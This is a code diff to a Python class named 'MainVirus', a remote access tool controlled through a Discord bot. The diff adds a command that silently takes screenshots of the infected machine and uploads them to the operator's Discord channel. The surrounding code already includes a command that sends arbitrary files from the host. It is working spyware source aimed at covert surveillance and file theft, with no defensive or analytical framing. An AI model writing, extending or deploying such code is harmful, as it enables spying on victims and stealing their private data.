@@ -1,5 +1,5 @@
 import lightbulb, hikari, asyncio, os, random, socket, subprocess, \
-    sys, requests, json  # installs the import we will need for making the bot
+    sys, requests, json, pyautogui, datetime  # installs the import we will need for making the bot
 from parser import Parser
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from pathlib import Path
@@ -16,6 +16,7 @@ class MainVirus:  # Making a class to wrap code cause organisation
             "exit": self.exit,
             "cdir": self.cd,
             "dog": self.cat,
+            "screen": self.screen,
         }
 
     def run(self):  # runs the program
@@ -76,6 +77,20 @@ class MainVirus:  # Making a class to wrap code cause organisation
             if self.isCommandConfirm(event, "dog"):  # Checks for confirmation
                 await self.bot.rest.create_message(self.channel_id, f"Sending File: {syntax[0]}")  # Sends information message - sends file name
                 fileLoc = os.path.join(self.cwd, syntax[0])  # Sets the file loc
+                await self.bot.rest.create_message(self.channel_id, hikari.File(fileLoc))  # Sends File
+
+    def screen(self, syntax):  # Screen command - Returns a ScreenShot
+        @self.bot.listen(hikari.GuildMessageCreateEvent)  # Message Sent Event
+        async def onConfirm(event):  # Creates the event function - runs on event
+            if self.isCommandConfirm(event, "screenshot"):  # Checks for confirmation
+                try: os.makedirs(os.path.join(os.getcwd(), "screenshot"))  # Attempts to create a screenshots folder
+                except: pass
+                now = datetime.datetime.now()  # Gets the current time
+                fileLoc = os.path.join(os.getcwd(), "screenshot", f"screenshot[{now.year}-{now.month}-{now.day}-{now.hour}-{now.minute}-{now.second}].png")  # Sets the fileLoc
+                await self.bot.rest.create_message(self.channel_id, "Taking Screenshot")  # Screenshot alert
+                screenshot = pyautogui.screenshot()  # Takes a screenshot
+                screenshot.save(fileLoc)  # Saves screenshot
+                await self.bot.rest.create_message(self.channel_id, "Sending Screenshot")  # Sending image alert
                 await self.bot.rest.create_message(self.channel_id, hikari.File(fileLoc))  # Sends File
 
     def exit(self, syntax):  # Exit command - Closes connection
